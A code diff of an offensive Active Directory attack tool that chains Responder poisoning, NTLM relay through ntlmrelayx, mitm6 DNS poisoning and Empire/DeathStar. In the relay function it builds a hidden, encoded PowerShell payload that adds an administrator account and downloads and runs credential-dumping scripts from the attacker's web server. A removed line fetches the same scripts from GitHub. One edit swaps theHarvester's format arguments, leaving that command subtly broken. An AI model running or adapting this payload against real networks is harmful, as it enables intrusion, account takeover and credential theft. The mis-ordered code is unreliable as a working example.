@@ -27,7 +27,7 @@ from libnmap.parser import NmapParser, NmapParserException
 from http.server import HTTPServer as BaseHTTPServer, SimpleHTTPRequestHandler
 
 # Debug
-#from IPython import embed
+from IPython import embed
 
 # Disable the InsecureRequests warning and the 'Starting new HTTPS connection' log message
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -47,6 +47,7 @@ def parse_args():
     parser.add_argument("-i", "--interface", help="Interface to use with Responder")
     parser.add_argument("-c", "--command", help="Remote command to run upon successful NTLM relay")
     parser.add_argument("-d", "--domain", help="Domain to use with theHarvester to gather usernames for reverse bruteforce, e.g., google.com")
+    parser.add_argument("--port", type=int, default=443, help="Port to run the webserver on; the webserver serves Mimikatz and PowerDump in attack 4 and 5")
     parser.add_argument("--auto", help="Start up Empire and DeathStar to automatically get domain admin using [xterm/tmux], defaults to tmux, e.g., --auto xterm")
     return parser.parse_args()
 
@@ -216,7 +217,7 @@ def run_smbclient(server, share_name, action, scf_filepath):
     smb_cmds_filename = 'smb-cmds.txt'
     smb_cmds_data = 'use {}\n{} {}\nls\nexit'.format(share_name, action, scf_filepath)
     write_to_file(smb_cmds_filename, smb_cmds_data, 'w+')
-    smbclient_cmd = 'python2 submodules/impacket/examples/smbclient.py {} -f {}'.format(server, smb_cmds_filename)
+    smbclient_cmd = 'python2 {}/submodules/impacket/examples/smbclient.py {} -f {}'.format(os.getcwd(), server, smb_cmds_filename)
     print_info("Running '{}' with the verb '{}'".format(smbclient_cmd, action))
     stdout, stderr = Popen(smbclient_cmd.split(), stdout=PIPE, stderr=PIPE).communicate()
 
@@ -633,12 +634,13 @@ def smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users, DCs)
 
     return prev_creds, prev_users, domains
 
+
 def do_ridenum(loop, null_hosts):
     '''
     Runs and gathers the output from ridenum
     '''
     print_info('Checking for usernames. This may take a bit...')
-    ridenum_cmd = 'python2 submodules/ridenum/ridenum.py {} 500 50000 | tee -a logs/ridenum.log'
+    ridenum_cmd = 'python2 '+os.getcwd()+'/submodules/ridenum/ridenum.py {} 500 50000 | tee -a logs/ridenum.log'
     ridenum_cmds = create_cmds(null_hosts, ridenum_cmd)
     print_info('Example command that will run: '+ridenum_cmds[0].split('&& ')[1])
     ridenum_output = async_get_outputs(loop, ridenum_cmds)
@@ -663,7 +665,7 @@ def run_theHarvester(ip_users, prev_users, null_sess_hosts, domain, host, DCs):
     Run theHarvester to collect more potential usernames
     '''
     users = []
-    cmd = 'python2 submodules/theHarvester/theHarvester.py -d {} -b all'.format(domain)
+    cmd = 'python2 {}/submodules/theHarvester/theHarvester.py -d {} -b all'.format(domain, os.getcwd())
     rid_users = False
     unallowed_AD_chars = ['/','\\','[',']',':',';','|','=','+','*','?','<','>','"','@']
     if len(ip_users) > 0:
@@ -954,7 +956,7 @@ def start_responder_llmnr(iface):
     Start Responder alone for LLMNR attack
     '''
     edit_responder_conf('On', ['HTTP', 'SMB'])
-    resp_cmd = 'python2 submodules/Responder/Responder.py -wrd -I {}'.format(iface)
+    resp_cmd = 'python2 {}/submodules/Responder/Responder.py -wrd -I {}'.format(os.getcwd(), iface)
     resp_proc = run_proc(resp_cmd)
     print_info('Responder-Session.log:')
     return resp_proc
@@ -964,7 +966,7 @@ def run_relay_attack(iface, args):
     Start ntlmrelayx for ntlm relaying
     '''
     edit_responder_conf('Off', ['HTTP', 'SMB'])
-    resp_cmd = 'python2 submodules/Responder/Responder.py -wrd -I {}'.format(iface)
+    resp_cmd = 'python2 {}/submodules/Responder/Responder.py -wrd -I {}'.format(os.getcwd(), iface)
     resp_proc = run_proc(resp_cmd)
 
     if args.command:
@@ -973,7 +975,6 @@ def run_relay_attack(iface, args):
         remote_cmd = run_empire_deathstar(iface, args)
     else:
         local_ip = get_local_ip(iface)
-#        text_cmd = "net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Invoke-Cats/master/Invoke-Cats.ps1'); Invoke-Cats -pwds; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Invoke-Pwds/master/Invoke-Pwds.ps1'); Invoke-Pwds"
         text_cmd = "net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('http://{}:443/Invoke-Cats.ps1'); Invoke-Cats -pwds; IEX (New-Object Net.WebClient).DownloadString('http://{}:443/Invoke-Pwds.ps1'); Invoke-Pwds".format(local_ip, local_ip)
         enc_cmd = encode_for_ps(text_cmd)
         remote_cmd = 'powershell -nop -exec bypass -w hidden -enc {}'.format(enc_cmd)
@@ -985,11 +986,11 @@ def run_relay_attack(iface, args):
 
     # I'm aware this can be more elegant but I don't feel like doing it right now (send PRs)
     if args.command == 'default':
-        relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
-                     ' -of hashes/ntlmrelay-hashes{} -wa 3'.format(signing_disabled))
+        relay_cmd = ('python2 {}/submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
+                     ' -of hashes/ntlmrelay-hashes{} -wa 3'.format(os.getcwd(), signing_disabled))
     else:
-        relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
-                     ' -of hashes/ntlmrelay-hashes{} -wa 3 -c "{}"'.format(signing_disabled, remote_cmd))
+        relay_cmd = ('python2 {}/submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
+                     ' -of hashes/ntlmrelay-hashes{} -wa 3 -c "{}"'.format(os.getcwd(), signing_disabled, remote_cmd))
 
     ntlmrelay_proc = run_proc(relay_cmd)
 
@@ -1238,35 +1239,33 @@ def parse_ntlmrelay_line(line, successful_auth, prev_creds, args):
     return prev_creds, successful_auth
 
 def run_ipv6_dns_poison():
-    '''
-    Runs mitm6 to poison DNS via IPv6
-    '''
+    '''Runs mitm6 to poison DNS via IPv6'''
     cmd = 'mitm6'
     mitm6_proc = run_proc(cmd)
 
     return mitm6_proc
 
 class HTTPHandler(SimpleHTTPRequestHandler):
-    """This handler uses server.base_path instead of always using os.getcwd()"""
+    '''This handler uses server.base_path instead of always using os.getcwd()'''
     def translate_path(self, path):
         path = SimpleHTTPRequestHandler.translate_path(self, path)
         relpath = os.path.relpath(path, os.getcwd())
         fullpath = os.path.join(self.server.base_path, relpath)
         return fullpath
-
+    def log_message(self, format, *args):
+        pass
 
 class HTTPServer(BaseHTTPServer):
-    """The main server, you pass in base_path which is the path you want to serve requests from"""
+    '''The main server, you pass in base_path which is the path you want to serve requests from'''
     def __init__(self, base_path, server_address, RequestHandlerClass=HTTPHandler):
         self.base_path = base_path
         BaseHTTPServer.__init__(self, server_address, RequestHandlerClass)
 
-def start_webserver():
-    PORT = 443
+def start_webserver(port):
     web_dir = os.path.join(os.path.dirname(__file__), 'web')
     handler = http.server.SimpleHTTPRequestHandler
-    #httpd = socketserver.TCPServer(("", PORT), handler)
-    httpd = HTTPServer(web_dir, ("", PORT))
+    #httpd = socketserver.TCPServer(("", port), handler)
+    httpd = HTTPServer(web_dir, ("", port))
     print_info('Starting web server to host Powershell payloads')
     t = Thread(target = httpd.serve_forever)
     t.daemon = True
@@ -1274,16 +1273,14 @@ def start_webserver():
     return httpd
 
 def do_ntlmrelay(prev_creds, args, iface):
-    '''
-    Continuously monitor and parse ntlmrelay output
-    '''
+    '''Continuously monitor and parse ntlmrelay output'''
     mitm6_proc = None
 
     print()
     print_info('Attack 4: NTLM relay with Responder and ntlmrelayx')
 
     if not args.command:
-        httpd = start_webserver()
+        httpd = start_webserver(args.port)
 
     resp_proc, ntlmrelay_proc = run_relay_attack(iface, args)
 
@@ -1445,8 +1442,8 @@ def run_empire_deathstar(iface, args):
     base_url = 'https://0.0.0.0:1337'
     user = 'icebreaker'
     passwd = 'P@ssword123456'
-    empire_cmd = 'cd submodules/Empire;python2 empire --rest --username {} --password {}'.format(user,passwd)
-    ds_cmd = 'python submodules/DeathStar/DeathStar.py -u {} -p {} -lip http://{}:8080 -lp 8080'.format(user, passwd, get_local_ip(iface))
+    empire_cmd = 'cd {}/submodules/Empire;python2 empire --rest --username {} --password {}'.format(os.getcwd(), user,passwd)
+    ds_cmd = 'python {}/submodules/DeathStar/DeathStar.py -u {} -p {} -lip http://{}:8080 -lp 8080'.format(os.getcwd(), user, passwd, get_local_ip(iface))
 
     if args.auto == 'xterm':
         empire_proc = run_proc_xterm(empire_cmd)
